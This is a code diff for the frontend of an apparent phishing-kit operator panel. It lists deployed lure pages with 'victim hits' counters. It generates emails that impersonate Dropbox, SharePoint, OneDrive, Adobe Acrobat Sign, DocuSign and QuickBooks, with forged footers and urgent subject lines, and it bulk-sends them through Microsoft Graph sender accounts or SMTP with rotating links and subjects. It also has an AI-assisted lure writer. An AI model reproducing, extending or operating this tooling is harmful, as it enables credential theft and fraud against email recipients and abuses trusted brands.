+                updateB2BLivePreview();
+            } else {
+                setTimeout(updateB2BLivePreview, 50);
+            }
+        });
+
+        // Attach live input listeners for real-time preview sync
+        ['b2b-editor', 'b2b-source-ta', 'b2b-links', 'b2b-subjects', 'b2b-recipients'].forEach(id => {
+            const el = document.getElementById(id);
+            if (el) {
+                el.addEventListener('input', scheduleB2BLivePreview);
+                el.addEventListener('keyup', scheduleB2BLivePreview);
+                el.addEventListener('change', scheduleB2BLivePreview);
+                if (id === 'b2b-source-ta') {
+                    el.addEventListener('input', autoResizeSourceTa);
+                }
+            }
+        });
+
+        // ── Import Template Modal Engine ───────────────────────────────
+        function openB2BImportModal() {
+            const modal = document.getElementById('b2b-import-modal');
+            if (!modal) return;
+            modal.style.display = 'flex';
+            const search = document.getElementById('b2b-import-search');
+            if (search) { search.value = ''; }
+            loadB2BImportDeployments();
+        }
+
+        function closeB2BImportModal() {
+            const modal = document.getElementById('b2b-import-modal');
+            if (modal) modal.style.display = 'none';
+        }
+
+        async function loadB2BImportDeployments() {
+            const container = document.getElementById('b2b-import-deployments-list');
+            if (!container) return;
+            container.innerHTML = '<div style="text-align:center;color:#cbd5e1;padding:24px;font-size:13px;">⚡ Loading active deployments...</div>';
+
+            try {
+                const res = await fetch('/api/lg/deployments');
+                const list = await res.json();
+                _b2bImportDeploymentsList = Array.isArray(list) ? list.filter(d => d.status === 'active' || !d.status) : [];
+                renderB2BImportDeployments(_b2bImportDeploymentsList);
+            } catch(e) {
+                container.innerHTML = `<div style="text-align:center;color:#f87171;padding:24px;font-size:13px;">Failed to load deployments: ${escapeHtml(e.message)}</div>`;
+            }
+        }
+
+        function filterB2BImportDeployments() {
+            const rawQ = (document.getElementById('b2b-import-search')?.value || '').trim();
+            const q = rawQ.toLowerCase();
+
+            let customCardHtml = '';
+            if (rawQ.startsWith('http://') || rawQ.startsWith('https://') || rawQ.includes('.ngrok') || rawQ.includes('.info') || rawQ.includes('.com') || rawQ.includes('.dev')) {
+                const brandGuess = q.includes('dropbox') ? 'Dropbox' :
+                                   q.includes('sharepoint') ? 'SharePoint' :
+                                   q.includes('onedrive') ? 'OneDrive' :
+                                   q.includes('adobe') ? 'Adobe' :
+                                   q.includes('docusign') ? 'DocuSign' : 'Document Share';
+                customCardHtml = `
+                <div class="b2b-import-card" style="border-color:#e50914;background:linear-gradient(135deg,rgba(229,9,20,0.18),#140a0d);">
+                    <div class="b2b-import-card-info">
+                        <div class="b2b-import-card-name">
+                            <span style="font-size:1.25em;">⚡</span>
+                            <span>Direct Link Import</span>
+                            <span class="b2b-import-badge" style="background:#e50914;color:#ffffff;">${escapeHtml(brandGuess)}</span>
+                        </div>
+                        <div class="b2b-import-card-url" title="${escapeHtml(rawQ)}">🔗 ${escapeHtml(rawQ)}</div>
+                        <div class="b2b-import-card-meta">Instant 1-click import for this link & matching email template</div>
+                    </div>
+                    <button class="b2b-import-select-btn" onclick="selectB2BImportCustomUrl('${encodeURIComponent(rawQ)}', '${brandGuess}')">⚡ Import This URL</button>
+                </div>`;
+            }
+
+            if (!q) {
+                renderB2BImportDeployments(_b2bImportDeploymentsList, customCardHtml);
+                return;
+            }
+
+            const filtered = _b2bImportDeploymentsList.filter(d => {
+                const name = (d.name || '').toLowerCase();
+                const url = (d.full_url || (`http://${d.domain || 'localhost'}/${d.path || ''}`)).toLowerCase();
+                const path = (d.path || '').toLowerCase();
+                const pre = (d.preland_name || '').toLowerCase();
+                const lnd = (d.landing_name || '').toLowerCase();
+                return name.includes(q) || url.includes(q) || path.includes(q) || pre.includes(q) || lnd.includes(q) || (path && q.includes(path));
+            });
+
+            renderB2BImportDeployments(filtered, customCardHtml);
+        }
+
+        function renderB2BImportDeployments(list, customCardHtml = '') {
+            const container = document.getElementById('b2b-import-deployments-list');
+            if (!container) return;
+
+            let cardsHtml = '';
+            if (list && list.length) {
+                cardsHtml = list.map(d => {
+                    const brand = d.preland_name || d.landing_name || d.name || 'Cloud Service';
+                    const icon = (d.preland_name || '').includes('Dropbox') ? '📦' :
+                                 (d.preland_name || '').includes('OneDrive') ? '☁️' :
+                                 (d.preland_name || '').includes('SharePoint') ? '📁' :
+                                 (d.preland_name || '').includes('Adobe') ? '📄' :
+                                 (d.preland_name || '').includes('DocuSign') ? '✍️' : '🔗';
+
+                    const fullUrl = d.full_url || (`http://${d.domain || 'localhost'}/${d.path || ''}`);
+
+                    return `
+                    <div class="b2b-import-card">
+                        <div class="b2b-import-card-info">
+                            <div class="b2b-import-card-name">
+                                <span style="font-size:1.25em;">${icon}</span>
+                                <span>${escapeHtml(d.name || brand)}</span>
+                                <span class="b2b-import-badge">${escapeHtml(brand)}</span>
+                            </div>
+                            <div class="b2b-import-card-url" title="${escapeHtml(fullUrl)}">🔗 ${escapeHtml(fullUrl)}</div>
+                            <div class="b2b-import-card-meta">Hits: <b style="color:#ffffff">${d.victim_hits||0}</b> · Deployed: ${escapeHtml((d.deployed_at||d.created_at||'').slice(0,10))}</div>
+                        </div>
+                        <button class="b2b-import-select-btn" onclick="selectB2BImportDeployment(${d.id})">⚡ Select & Import</button>
+                    </div>`;
+                }).join('');
+            }
+
+            if (!cardsHtml && !customCardHtml) {
+                container.innerHTML = `
+                    <div style="text-align:center;color:#cbd5e1;padding:36px;font-size:13px;">
+                        <div style="font-size:28px;margin-bottom:8px;">🔗</div>
+                        <div style="font-weight:700;color:#ffffff;margin-bottom:4px;">No active deployed links found</div>
+                        <div>Deploy a campaign in the <b>Deployments</b> tab or paste any live URL above to import.</div>
+                    </div>`;
+                return;
+            }
+
+            container.innerHTML = customCardHtml + cardsHtml;
+        }
+
+        async function selectB2BImportCustomUrl(encodedUrl, brand) {
+            const fullUrl = decodeURIComponent(encodedUrl);
+            const linksTa = document.getElementById('b2b-links');
+            if (linksTa) linksTa.value = fullUrl;
+
+            try {
+                const res = await fetch(`/api/b2b/preview_template?brand=${encodeURIComponent(brand)}&url=${encodeURIComponent(fullUrl)}`);
+                if (res.ok) {
+                    const data = await res.json();
+                    if (data && data.html) {
+                        const editor = document.getElementById('b2b-editor');
+                        const srcTa = document.getElementById('b2b-source-ta');
+                        if (editor) editor.innerHTML = data.html;
+                        if (srcTa) srcTa.value = data.html;
+
+                        const subjectsTa = document.getElementById('b2b-subjects');
+                        if (subjectsTa && data.subjects) subjectsTa.value = data.subjects;
+
+                        switchB2BTab('edit');
+                        autoResizeSourceTa();
+                        updateB2BLivePreview();
+                        closeB2BImportModal();
+                        showToast(`✓ Imported authentic ${brand} template & link!`);
+                        return;
+                    }
+                }
+            } catch (e) {
+                console.warn('Custom URL preview template fetch fallback', e);
+            }
+
+            const tpl = getB2BEmailTemplateForService(brand, fullUrl);
+            const subjectsTa = document.getElementById('b2b-subjects');
+            if (subjectsTa) subjectsTa.value = tpl.subjects;
+
+            const editor = document.getElementById('b2b-editor');
+            const srcTa = document.getElementById('b2b-source-ta');
+            if (editor) editor.innerHTML = tpl.html;
+            if (srcTa) srcTa.value = tpl.html;
+
+            switchB2BTab('edit');
+            autoResizeSourceTa();
+            updateB2BLivePreview();
+            closeB2BImportModal();
+            showToast(`✓ Imported ${brand} template & link!`);
+        }
+
+        function getB2BEmailTemplateForService(brand, fullUrl) {
+            const b = (brand || '').toLowerCase();
+            let accent = '#0078D4', badge = 'DOC', badgeBg = '#0078D4', badgeCol = '#ffffff', btnCol = '#ffffff';
+            let title = 'Protected Document', desc = 'A secure document has been transmitted to you. Access requires organization verification.';
+            let docName = 'Protected-Document.pdf', docSub = 'Encrypted File · Intended for [EMAIL]';
+            let btnLabel = 'Access Document', btnRadius = '6px';
+            let foot1 = 'End-to-end encrypted notification for [COMPANY]', foot2 = 'Secure Communications System';
+            let headerLogo = '<div style="font-size:26px;margin-bottom:6px;">🔒</div><div style="font-size:16px;font-weight:700;color:#0f172a;">Secure Document Portal</div>';
+
+            if (b.includes('dropbox')) {
+                accent = '#0061FF'; badge = 'PDF'; badgeBg = '#0061FF';
+                title = 'Dropbox File Shared';
+                desc = 'A confidential document has been shared with you via Dropbox. Verify your identity to access.';
+                docName = 'Proposal-Shared.pdf';
+                docSub = 'Dropbox Cloud Storage · 4.2 MB · Shared with [EMAIL]';
+                btnLabel = 'View on Dropbox'; btnRadius = '6px';
+                foot1 = 'Sign in to Dropbox to access · Link expires in 48 hours';
+                foot2 = 'Dropbox, Inc. · Secure Cloud Storage';
+                headerLogo = '<div style="font-size:26px;margin-bottom:4px;">📦</div><div style="font-size:17px;font-weight:800;color:#0061FF;letter-spacing:-0.5px;">Dropbox</div>';
+            } else if (b.includes('sharepoint')) {
+                accent = '#038387'; badge = 'PDF'; badgeBg = '#038387';
+                title = 'SharePoint Document Request';
+                desc = 'A secure document has been transmitted to you on SharePoint. Access requires organization verification.';
+                docName = 'SharePoint-Document-Review.pdf';
+                docSub = 'SharePoint Online · Shared with [COMPANY]';
+                btnLabel = 'Open in SharePoint'; btnRadius = '4px';
+                foot1 = 'Microsoft SharePoint Online · Intended for [EMAIL]';
+                foot2 = 'Microsoft Corporation · Secure Transmission';
+                headerLogo = '<div style="font-size:26px;margin-bottom:4px;">📁</div><div style="font-size:17px;font-weight:700;color:#038387;">Microsoft SharePoint</div>';
+            } else if (b.includes('onedrive')) {
+                accent = '#0078D4'; badge = 'DOCX'; badgeBg = '#0078D4';
+                title = 'OneDrive Document Shared';
+                desc = 'This protected document requires your organization identity verification to review.';
+                docName = 'Protected-Document.docx';
+                docSub = 'OneDrive Cloud Storage · Access restricted to [EMAIL]';
+                btnLabel = 'Access Protected File'; btnRadius = '4px';
+                foot1 = 'This link is protected and expires in 48 hours';
+                foot2 = 'Microsoft Corporation · One Microsoft Way, Redmond, WA';
+                headerLogo = '<div style="font-size:26px;margin-bottom:4px;">☁️</div><div style="font-size:17px;font-weight:700;color:#0078D4;">Microsoft OneDrive</div>';
+            } else if (b.includes('adobe')) {
+                accent = '#FA0F00'; badge = 'PDF'; badgeBg = '#FA0F00';
+                title = 'Adobe Acrobat Sign';
+                desc = 'Please review and electronically sign this document for [COMPANY].';
+                docName = 'Agreement-Review.pdf';
+                docSub = 'Adobe Acrobat Sign · Sent to [EMAIL]';
+                btnLabel = 'Review and Sign'; btnRadius = '20px';
+                foot1 = 'Secured with Adobe 256-bit encryption';
+                foot2 = 'Adobe Systems Software Ireland Limited';
+                headerLogo = '<div style="font-size:26px;margin-bottom:4px;">📄</div><div style="font-size:17px;font-weight:800;color:#FA0F00;letter-spacing:-0.5px;">Adobe Acrobat Sign</div>';
+            } else if (b.includes('docusign')) {
+                accent = '#FFCE00'; badge = 'DOC'; badgeBg = '#FFCE00'; badgeCol = '#111'; btnCol = '#111';
+                title = 'DocuSign Document Pending';
+                desc = '[COMPANY] has sent you a document to review and complete signing.';
+                docName = 'Contract-Agreement.pdf';
+                docSub = 'DocuSign Electronic Signature · Recipient: [EMAIL]';
+                btnLabel = 'Review Document'; btnRadius = '4px';
+                foot1 = 'Powered by DocuSign Ink · Legally Binding Signature';
+                foot2 = 'DocuSign, Inc. · Electronic Record Disclosure';
+                headerLogo = '<div style="font-size:26px;margin-bottom:4px;">✍️</div><div style="font-size:17px;font-weight:800;color:#111827;">DocuSign</div>';
+            } else if (b.includes('quickbooks')) {
+                accent = '#2CB34A'; badge = 'INV'; badgeBg = '#2CB34A';
+                title = 'QuickBooks Invoice';
+                desc = 'Invoice #[DOMAIN]-4910 from [COMPANY] is ready for review.';
+                docName = 'Invoice-Details.pdf';
+                docSub = 'Intuit QuickBooks Online · Amount Due: $1,420.00';
+                btnLabel = 'View Invoice'; btnRadius = '4px';
+                foot1 = 'Intuit Payment Network · Secure Billing Link';
+                foot2 = 'Intuit Inc. · All rights reserved';
+                headerLogo = '<div style="font-size:26px;margin-bottom:4px;">💳</div><div style="font-size:17px;font-weight:800;color:#2CB34A;">Intuit QuickBooks</div>';
+            }
+
+            const subjects = b.includes('dropbox') ? `[NAME], shared "Proposal-v2.pptx" with you on Dropbox\n[NAME], a file has been shared with you via Dropbox\nAction Required: View shared file on Dropbox` :
+                             b.includes('onedrive') ? `[NAME] shared a secure document with you on OneDrive\n[NAME], Important OneDrive shared file: Action Required\nReview requested: Protected document via OneDrive` :
+                             b.includes('sharepoint') ? `[NAME], Review requested: SharePoint Document\n[NAME], You have received a new document in SharePoint\nShared File: SharePoint Document for [COMPANY]` :
+                             b.includes('adobe') ? `[NAME], Please sign: Agreement pending your signature\nAdobe Acrobat: Signature requested on document\nAction Required: Document ready for review` :
+                             b.includes('docusign') ? `[NAME], Please DocuSign: Document pending your signature\nDocuSign: Important document waiting for completion\nAction Required: Complete signing session for [COMPANY]` :
+                             b.includes('quickbooks') ? `Invoice #[DOMAIN]-4910 from [COMPANY] is ready for review\nQuickBooks: Notification regarding your recent billing receipt\nAction Required: Review updated invoice from [COMPANY]` :
+                             `[NAME], Important update regarding your document access\n[NAME], Shared document ready for review\nAction Required: Secure document from [COMPANY]`;
+
+            const html = `<div class="b2b-card-outer" style="max-width:350px;width:350px;margin:12px auto;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
+  <p style="margin:0 0 10px;font-size:13.5px;color:#1e293b;line-height:1.4;">Hello [NAME],</p>
+  <div class="b2b-email-card" style="width:100%;max-width:350px;background:#ffffff;border:1px solid #e2e8f0;border-radius:12px;box-shadow:0 4px 22px rgba(0,0,0,0.08);padding:22px 18px 16px;text-align:center;box-sizing:border-box;">
+    ${headerLogo}
+    <h2 style="font-size:16.5px;font-weight:700;color:#0f172a;margin:10px 0 5px;line-height:1.3;letter-spacing:-0.2px;">${title}</h2>
+    <p style="font-size:12.5px;color:#64748b;margin:0 0 14px;line-height:1.45;">${desc}</p>
+    <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:7px;padding:9px 12px;display:flex;align-items:center;gap:10px;margin:0 0 15px;text-align:left;box-sizing:border-box;">
+      <span style="background:${badgeBg};color:${badgeCol};font-size:10.5px;font-weight:700;padding:2px 6px;border-radius:4px;flex-shrink:0;letter-spacing:0.4px;">${badge}</span>
+      <div style="overflow:hidden;flex:1;">
+        <div style="font-size:12.5px;font-weight:600;color:#1e293b;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${docName}</div>
+        <div style="font-size:10.5px;color:#94a3b8;margin-top:1px;">${docSub}</div>
+      </div>
+    </div>
+    <div style="margin:14px 0 10px;">
+      <a href="[LINK]" target="_blank" style="display:flex;align-items:center;justify-content:center;gap:6px;width:100%;box-sizing:border-box;background-color:${accent};color:${btnCol} !important;text-decoration:none;font-weight:600;font-size:13.5px;padding:10px 18px;border-radius:${btnRadius};box-shadow:0 2px 8px rgba(0,0,0,0.12);transition:opacity 0.15s;">🔒 ${btnLabel}</a>
+    </div>
+    <div style="border-top:1px solid #f1f5f9;margin-top:14px;padding-top:10px;">
+      <div style="font-size:11px;color:#94a3b8;margin-bottom:2px;">${foot1}</div>
+      <div style="font-size:10.5px;color:#cbd5e1;">🔒 ${foot2}</div>
+    </div>
+  </div>
+  <p style="margin:10px 0 0;font-size:12px;color:#64748b;line-height:1.4;"><br></p>
+</div>`;
+
+            return { subjects, html };
+        }
+
+        async function selectB2BImportDeployment(depId) {
+            const dep = _b2bImportDeploymentsList.find(d => d.id == depId);
+            const fullUrl = dep ? (dep.full_url || (`http://${dep.domain || 'localhost'}/${dep.path || ''}`)) : '';
+            const brand = dep ? (dep.preland_name || dep.landing_name || dep.name || 'Document Share') : 'Document Share';
+
+            // 1. Populate Link Lines
+            const linksTa = document.getElementById('b2b-links');
+            if (linksTa && fullUrl) linksTa.value = fullUrl;
+
+            // 2. Fetch the exact authentic template HTML and subjects from backend
+            try {
+                const res = await fetch(`/api/b2b/deployment_template/${depId}`);
+                if (res.ok) {
+                    const data = await res.json();
+                    if (data && data.html) {
+                        const editor = document.getElementById('b2b-editor');
+                        const srcTa = document.getElementById('b2b-source-ta');
+                        if (editor) editor.innerHTML = data.html;
+                        if (srcTa) srcTa.value = data.html;
+
+                        const subjectsTa = document.getElementById('b2b-subjects');
+                        if (subjectsTa && data.subjects) subjectsTa.value = data.subjects;
+
+                        switchB2BTab('edit');
+                        autoResizeSourceTa();
+                        updateB2BLivePreview();
+                        closeB2BImportModal();
+                        showToast(`✓ Imported exact authentic ${data.brand || brand} template & link!`);
+                        return;
+                    }
+                }
+            } catch (err) {
+                console.warn('Failed to fetch deployment template, falling back to local generator', err);
+            }
+
+            // Fallback
+            const tpl = getB2BEmailTemplateForService(brand, fullUrl);
+            const subjectsTa = document.getElementById('b2b-subjects');
+            if (subjectsTa) subjectsTa.value = tpl.subjects;
+
+            const editor = document.getElementById('b2b-editor');
+            const srcTa = document.getElementById('b2b-source-ta');
+            if (editor) editor.innerHTML = tpl.html;
+            if (srcTa) srcTa.value = tpl.html;
+
+            // 3. Switch to edit tab & update preview
+            switchB2BTab('edit');
+            autoResizeSourceTa();
+            updateB2BLivePreview();
+
+            // 4. Close modal & show toast
+            closeB2BImportModal();
+            showToast(`✓ Imported ${brand} template & link!`);
+        }
+
+        // ── Send engine ───────────────────────────────────────────────
+        function b2bTermLog(msg, cls) {
+            const term = document.getElementById('b2b-terminal');
+            const elapsed = _b2bStartTime ? Math.floor((Date.now() - _b2bStartTime) / 1000) : 0;
+            const mm = String(Math.floor(elapsed/60)).padStart(2,'0'), ss = String(elapsed%60).padStart(2,'0');
+            const div = document.createElement('div');
+            div.className = `terminal-line ${cls || ''}`;
+            div.innerHTML = `<span class="term-ts">[${mm}:${ss}]</span><span class="term-txt">${msg}</span>`;
+            term.appendChild(div);
+            term.scrollTop = term.scrollHeight;
+        }
+
+        async function startB2BSend() {
+            const uc = document.getElementById('b2b-account-select').value;
+            const sendMode = document.getElementById('b2b-send-mode').value;
+            if (sendMode === 'graph' && !uc) { showToast('Select a sender account for Graph API mode'); return; }
+            const recipients = document.getElementById('b2b-recipients').value.trim().split('\n').map(l=>l.trim()).filter(l=>l.includes('@'));
+            if (!recipients.length) { showToast('Add at least one recipient'); return; }
+            const subjects = document.getElementById('b2b-subjects').value.trim().split('\n').filter(l=>l.trim());
+            if (!subjects.length) { showToast('Add at least one subject line'); return; }
+
+            // ── body: read from whichever panel is active ──────────────
+            let body_html = b2bGetHtml().trim();
+            // Strip an accidental plain-text empty editor
+            if (!body_html || body_html === '<br>' || body_html === '<p><br></p>') {
+                showToast('Email body is empty'); return;
+            }
+
+            const links = document.getElementById('b2b-links').value.trim().split('\n').filter(l=>l.trim());
+            const btn = document.getElementById('b2b-send-btn');
+            btn.disabled = true; btn.textContent = '⏳ Sending...';
+
+            document.getElementById('b2b-terminal').innerHTML = '';
+            _b2bSentCt = 0; _b2bFailCt = 0;
+            document.getElementById('b2b-sent-ct').textContent = '0';
+            document.getElementById('b2b-fail-ct').textContent = '0';
+            document.getElementById('b2b-total-ct').textContent = recipients.length;
+            _b2bStartTime = Date.now();
+
+            b2bTermLog(`🚀 Campaign: "${document.getElementById('b2b-campaign-name').value||'Unnamed'}" → ${recipients.length} recipients`, 'header');
+
+            let attachmentsPayload = [];
+            if (_b2bFiles && _b2bFiles.length > 0) {
+                b2bTermLog(`📎 Processing ${_b2bFiles.length} attachment(s)...`);
+                for (const f of _b2bFiles) {
+                    try {
+                        const b64 = await new Promise((res, rej) => {
+                            const r = new FileReader();
+                            r.onload = () => res(r.result.split(',')[1]);
+                            r.onerror = rej;
+                            r.readAsDataURL(f);
+                        });
+                        attachmentsPayload.push({
+                            '@odata.type': '#microsoft.graph.fileAttachment',
+                            name: f.name,
+                            contentType: f.type || 'application/octet-stream',
+                            contentBytes: b64
+                        });
+                    } catch(err) {
+                        b2bTermLog(`⚠️ Could not read ${f.name}: ${err}`, 'warning');
+                    }
+                }
+            }
+
+            const payload = { user_code:uc, recipients, subjects, links,
+                subject_rotate_n: parseInt(document.getElementById('b2b-subject-rotate').value)||1,
+                link_rotate_n: parseInt(document.getElementById('b2b-link-rotate').value)||1,
+                body_html, priority: _b2bPriority, delay_ms: _b2bDelayMs, bcc_mode: _b2bBCC, save_sent: _b2bSaveSent,
+                attachments: attachmentsPayload,
+                smtp: sendMode === 'smtp' ? _smtpCfg : undefined };
+
+            const apiEndpoint = sendMode === 'smtp' ? '/api/b2b/send_smtp' : '/api/b2b/send';
+
+            try {
+                const resp = await fetch(apiEndpoint, {
+                    method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload)
+                });
+                const reader = resp.body.getReader();
+                const dec = new TextDecoder();
+                let buf = '';
+                while (true) {
+                    const {done, value} = await reader.read();
+                    if (done) break;
+                    buf += dec.decode(value, {stream:true});
+                    const lines = buf.split('\n'); buf = lines.pop();
+                    for (const ln of lines) {
+                        if (!ln.startsWith('data: ')) continue;
+                        try {
+                            const d = JSON.parse(ln.slice(6));
+                            if (d.type === 'sent') {
+                                _b2bSentCt++;
+                                document.getElementById('b2b-sent-ct').textContent = _b2bSentCt;
+                                b2bTermLog(`✅ <b style="color:#f0f6fc">${d.recipient}</b> ← "${d.subject}"`, 'success');
+                            } else if (d.type === 'failed') {
+                                _b2bFailCt++;
+                                document.getElementById('b2b-fail-ct').textContent = _b2bFailCt;
+                                b2bTermLog(`❌ <b style="color:#f0f6fc">${d.recipient}</b> — ${d.error}`, 'error');
+                            } else if (d.type === 'done') {
+                                b2bTermLog(`✓ Done. Sent: ${d.sent} | Failed: ${d.failed}`, 'header');
+                            } else if (d.type === 'status') {
+                                b2bTermLog(d.msg, d.cls || 'dim');
+                            }
+                        } catch {}
+                    }
+                }
+            } catch(ex) {
+                b2bTermLog('❌ Send error: ' + ex, 'error');
+            }
+            btn.disabled = false; btn.innerHTML = '✈ SEND EMAIL';
+        }
+
+        function resetB2B() {
+            ['b2b-campaign-name','b2b-subjects','b2b-links','b2b-recipients'].forEach(id => document.getElementById(id).value='');
+            document.getElementById('b2b-editor').innerHTML = '';
+            document.getElementById('b2b-source-ta').value = '';
+            document.getElementById('b2b-subject-rotate').value = 1;
+            document.getElementById('b2b-link-rotate').value = 1;
+            _b2bFiles = [];
+            const fileInp = document.getElementById('b2b-file-input');
+            if (fileInp) fileInp.value = '';
+            renderB2BFilesList();
+            document.getElementById('b2b-terminal').innerHTML = '<div class="terminal-line dim"><span class="term-ts">[--:--]</span><span class="term-txt">Results appear here when you send.</span></div>';
+            ['b2b-sent-ct','b2b-fail-ct','b2b-total-ct'].forEach(id => document.getElementById(id).textContent='0');
+            updateB2BRecipientCount();
+        }
+
+        // ── Send mode ─────────────────────────────────────────────────
+        function onB2BSendModeChange() {
+            const mode = document.getElementById('b2b-send-mode').value;
+            document.getElementById('b2b-smtp-cfg-btn').style.display = mode === 'smtp' ? '' : 'none';
+            document.getElementById('b2b-account-select').style.opacity = mode === 'smtp' ? '0.35' : '1';
+        }
+
+        // ── SMTP settings ───────────────────────────────────────────
+        let _smtpCfg = JSON.parse(localStorage.getItem('crimson_paw_smtp') || localStorage.getItem('icebadger_smtp') || '{}');
+
+        function openSmtpSettings() {
+            const m = _smtpCfg;
+            document.getElementById('smtp-host').value     = m.host     || '';
+            document.getElementById('smtp-port').value     = m.port     || 587;
+            document.getElementById('smtp-security').value = m.security || 'tls';
+            document.getElementById('smtp-from').value     = m.from_addr|| '';
+            document.getElementById('smtp-fromname').value = m.from_name|| '';
+            document.getElementById('smtp-user').value     = m.user     || '';
+            document.getElementById('smtp-pass').value     = m.pass_enc || '';
+            document.getElementById('smtp-test-result').textContent = '';
+            document.getElementById('smtp-settings-modal').style.display = 'flex';
+        }
+
+        function closeSmtpSettings() {
+            document.getElementById('smtp-settings-modal').style.display = 'none';
+        }
+
+        function saveSmtpSettings() {
+            _smtpCfg = {
+                host:      document.getElementById('smtp-host').value.trim(),
+                port:      parseInt(document.getElementById('smtp-port').value) || 587,
+                security:  document.getElementById('smtp-security').value,
+                from_addr: document.getElementById('smtp-from').value.trim(),
+                from_name: document.getElementById('smtp-fromname').value.trim(),
+                user:      document.getElementById('smtp-user').value.trim(),
+                pass_enc:  document.getElementById('smtp-pass').value
+            };
+            localStorage.setItem('crimson_paw_smtp', JSON.stringify(_smtpCfg));
+            showToast('SMTP settings saved ✓');
+            closeSmtpSettings();
+        }
+
+        async function testSmtpConnection() {
+            const btn = document.getElementById('smtp-test-btn');
+            const res = document.getElementById('smtp-test-result');
+            btn.disabled = true; btn.textContent = '⏳ Testing...';
+            res.textContent = '';
+            const cfg = {
+                host:      document.getElementById('smtp-host').value.trim(),
+                port:      parseInt(document.getElementById('smtp-port').value)||587,
+                security:  document.getElementById('smtp-security').value,
+                from_addr: document.getElementById('smtp-from').value.trim(),
+                user:      document.getElementById('smtp-user').value.trim(),
+                password:  document.getElementById('smtp-pass').value
+            };
+            try {
+                const r = await (await fetch('/api/b2b/smtp_test', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(cfg)})).json();
+                res.style.color = r.success ? '#3fb950' : '#f85149';
+                res.textContent = r.success ? '✓ Connection successful!' : '✗ ' + r.error;
+            } catch(ex) { res.style.color='#f85149'; res.textContent='✗ '+ex; }
+            btn.disabled = false; btn.textContent = '⚡ Test Connection';
+        }
+
+        // ── Campaigns ─────────────────────────────────────────────────
+        async function saveB2BCampaign() {
+            const name = document.getElementById('b2b-campaign-name').value.trim() || 'Untitled Campaign';
+            const payload = {
+                name, subject_lines: document.getElementById('b2b-subjects').value,
+                link_lines: document.getElementById('b2b-links').value,
+                body_html: document.getElementById('b2b-editor').innerHTML,
+                recipients: document.getElementById('b2b-recipients').value,
+                sender_user_code: document.getElementById('b2b-account-select').value,
+                priority: _b2bPriority, delay_ms: _b2bDelayMs,
+                subject_rotate_n: parseInt(document.getElementById('b2b-subject-rotate').value)||1,
+                link_rotate_n: parseInt(document.getElementById('b2b-link-rotate').value)||1,
+                bcc_mode: _b2bBCC?1:0, save_sent: _b2bSaveSent?1:0
+            };
+            try {
+                const r = await (await fetch('/api/b2b/campaigns', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)})).json();
+                if (r.success) { showToast(`Saved "${name}"!`); loadB2BCampaignCount(); }
+                else showToast('Save failed: ' + (r.error||'?'));
+            } catch(ex) { showToast('Save error: '+ex); }
+        }
+
+        async function loadB2BCampaigns() {
+            document.getElementById('b2b-camps-modal').style.display = 'flex';
+            const listEl = document.getElementById('b2b-camps-list');
+            listEl.innerHTML = '<div class="terminal-line dim">Loading...</div>';
+            try {
+                const camps = await (await fetch('/api/b2b/campaigns')).json();
+                document.getElementById('b2b-campaign-count').textContent = camps.length;
+                if (!camps.length) { listEl.innerHTML = '<div class="terminal-line dim" style="padding:20px;text-align:center;">No saved campaigns yet.</div>'; return; }
+                listEl.innerHTML = camps.map(c => `
+                    <div class="b2b-camp-item" onclick="loadB2BCampaign(${c.id})">
+                        <div class="b2b-camp-name">${c.name||'Untitled'}</div>
+                        <div class="b2b-camp-meta">
+                            <span>${c.sender_user_code||'—'}</span>
+                            <span>${new Date(c.created_at).toLocaleDateString()}</span>
+                            <button onclick="event.stopPropagation();deleteB2BCampaign(${c.id})" style="background:none;border:none;color:#f85149;cursor:pointer;font-size:.85em;margin-left:auto">🗑</button>
+                        </div>
+                    </div>`).join('');
+            } catch(ex) { listEl.innerHTML = `<div class="terminal-line error">Error: ${ex}</div>`; }
+        }
+
+        async function loadB2BCampaign(id) {
+            try {
+                const c = await (await fetch(`/api/b2b/campaigns/${id}`)).json();
+                document.getElementById('b2b-campaign-name').value = c.name||'';
+                document.getElementById('b2b-subjects').value = c.subject_lines||'';
+                document.getElementById('b2b-links').value = c.link_lines||'';
+                document.getElementById('b2b-editor').innerHTML = c.body_html||'';
+                document.getElementById('b2b-recipients').value = c.recipients||'';
+                document.getElementById('b2b-subject-rotate').value = c.subject_rotate_n||1;
+                document.getElementById('b2b-link-rotate').value = c.link_rotate_n||1;
+                if (c.sender_user_code) { const s = document.getElementById('b2b-account-select'); if ([...s.options].find(o=>o.value===c.sender_user_code)) s.value = c.sender_user_code; }
+                _b2bPriority = c.priority||'normal';
+                document.getElementById('b2b-priority-label').textContent = _b2bPriority.toUpperCase();
+                _b2bBCC = !!c.bcc_mode; document.getElementById('b2b-bcc-sw').classList.toggle('on', _b2bBCC);
+                _b2bSaveSent = c.save_sent!==0;
+                document.getElementById('b2b-save-off').classList.toggle('active', !_b2bSaveSent);
+                document.getElementById('b2b-save-on').classList.toggle('active', _b2bSaveSent);
+                updateB2BRecipientCount();
+                document.getElementById('b2b-camps-modal').style.display='none';
+                showToast(`Campaign "${c.name}" loaded`);
+            } catch(ex) { showToast('Load failed: '+ex); }
+        }
+
+        async function deleteB2BCampaign(id) {
+            const ok = await appConfirm({
+                title: 'Delete Campaign',
+                message: 'Are you sure you want to delete this saved B2B campaign?',
+                confirmText: 'Delete Campaign',
+                danger: true,
+                icon: '🗑️'
+            });
+            if (!ok) return;
+            try {
+                await fetch(`/api/b2b/campaigns/${id}`, {method:'DELETE'});
+                showToast('✓ Campaign deleted');
+                loadB2BCampaigns();
+            } catch(e) {
+                showToast('⚠️ Delete failed: ' + e);
+            }
+        }
+
+        // ── AI Email Writer ──────────────────────────────────────────
+        let _aiGeneratedHtml = '';
+
+        async function openAIWriter() {
+            document.getElementById('ai-writer-modal').style.display = 'flex';
+            // Check if key is configured
+            try {
+                const r = await (await fetch('/api/b2b/ai_check')).json();
+                document.getElementById('ai-no-key-banner').style.display = r.ready ? 'none' : 'block';
+                document.getElementById('ai-gen-btn').disabled = !r.ready;
+            } catch {}
+        }
+
+        function closeAIWriter() {
+            document.getElementById('ai-writer-modal').style.display = 'none';
+        }
+
+        async function runAIGenerate() {
+            const instruction = document.getElementById('ai-instruction').value.trim();
+            if (!instruction) { showToast('Describe the email you want first'); return; }
+
